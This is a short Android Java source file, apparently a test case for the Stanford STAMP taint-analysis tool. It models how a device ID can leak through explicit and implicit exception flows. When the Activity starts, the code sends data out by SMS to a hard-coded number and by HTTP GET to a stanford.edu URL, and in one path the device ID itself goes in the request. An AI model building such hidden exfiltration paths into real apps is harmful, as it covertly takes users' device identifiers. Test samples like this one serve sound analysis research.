package stamp.stanford.malware;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

public class Malware extends Activity {
    public static class MyException extends Exception {
	public final String payload;
	public MyException(String payload) { this.payload = payload; }
    }

    public static void explicitExceptionLeak(String secret) throws MyException {
	throw new MyException(secret);
    }

    public static void implicitThrownExceptionLeak(String secret) throws MyException {
	if(secret == null) {
	    throw new MyException("");
	}
    }

    public static void implicitExceptionLeak(String secret) {
	Integer.parseInt(secret);
    }

    public static void leakSMS(String msg) {
	SmsManager sms = SmsManager.getDefault();
	sms.sendMultipartTextMessage("9995556677", null, sms.divideMessage(msg), null, null);
    }

    public static void leakHTTP(String msg) {
	try {
	    new DefaultHttpClient().execute(new HttpGet("http://stanford.edu/~subodh/cgi-bin/stamp/id.php?gps=" + msg));
	} catch(Exception e) {}
    }

    public static void leakDeviceIdExplicit(TelephonyManager tm) throws MyException {
	implicitThrownExceptionLeak(tm.getDeviceId());
    }

    public static void leakDeviceIdImplicit(TelephonyManager tm) {
	implicitExceptionLeak(tm.getDeviceId());
    }

    public static void leakDeviceIdImplicitThrown(TelephonyManager tm) throws MyException {
	implicitThrownExceptionLeak(tm.getDeviceId());
    }

    @Override public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
	
	try {
	    leakDeviceIdImplicit((TelephonyManager)getSystemService(TELEPHONY_SERVICE));
	} catch(NumberFormatException e) {
	    leakSMS("");
	}

	try {
	    leakDeviceIdImplicitThrown((TelephonyManager)getSystemService(TELEPHONY_SERVICE));
	} catch(MyException e) {
	    leakHTTP("");
	}

	try {
	    leakDeviceIdExplicit((TelephonyManager)getSystemService(TELEPHONY_SERVICE));
	} catch(MyException e) {
	    leakHTTP(e.payload);
	}
    }
    
    @Override public void onStart(){
	super.onStart();
    }
    
}
